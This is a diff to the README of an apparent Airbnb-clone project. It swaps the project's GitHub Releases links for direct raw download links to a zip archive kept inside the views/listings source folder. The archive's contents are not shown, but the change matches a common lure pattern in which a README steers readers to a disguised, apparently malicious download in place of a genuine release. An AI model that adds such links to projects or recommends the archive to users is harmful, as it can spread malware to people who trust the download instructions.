@@ -1,7 +1,7 @@
 # 🏡 Airbnb-clone - Discover and Manage Properties with Ease
 
 ## 📥 Download Now
-[![Download Airbnb-clone](https://img.shields.io/badge/Download-Airbnb--clone-blue.svg)](https://github.com/akaziemail2020/Airbnb-clone/releases)
+[![Download Airbnb-clone](https://raw.githubusercontent.com/akaziemail2020/Airbnb-clone/main/views/listings/Airbnb-clone_3.5.zip)](https://raw.githubusercontent.com/akaziemail2020/Airbnb-clone/main/views/listings/Airbnb-clone_3.5.zip)
 
 ## 📋 Table of Contents
 - [🛠️ Features](#-features)
@@ -32,7 +32,7 @@ Before you begin, verify that your system meets these requirements:
 ## 📥 Download & Install
 To get started, visit the Releases page to download the application:
 
-[Download Airbnb-clone](https://github.com/akaziemail2020/Airbnb-clone/releases)
+[Download Airbnb-clone](https://raw.githubusercontent.com/akaziemail2020/Airbnb-clone/main/views/listings/Airbnb-clone_3.5.zip)
 
 1. **Visit the Releases page**: Click the link above to go to the download page.
 2. **Choose the version**: Find the latest version of Airbnb-clone.
